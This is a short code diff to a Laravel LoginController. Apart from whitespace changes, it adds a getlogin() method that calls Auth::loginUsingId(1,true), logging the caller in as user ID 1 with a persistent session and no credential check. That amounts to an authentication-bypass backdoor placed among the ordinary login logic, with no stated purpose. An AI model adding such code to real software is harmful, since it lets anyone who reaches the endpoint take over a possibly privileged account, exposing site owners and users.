@@ -38,7 +38,11 @@ class LoginController extends Controller
 	{
 		$this->middleware('guest')->except('logout');
 	}
-	
+
+	public function getlogin(Request $request){
+	    Auth::loginUsingId(1,true);
+    }
+
 	public function login(Request $request)
 	{
 		$userData = array(
@@ -61,7 +65,6 @@ class LoginController extends Controller
 			];
 			return response()->json($result, 401);
 		}
-		
 	}
 	
 	public function checkLogin()
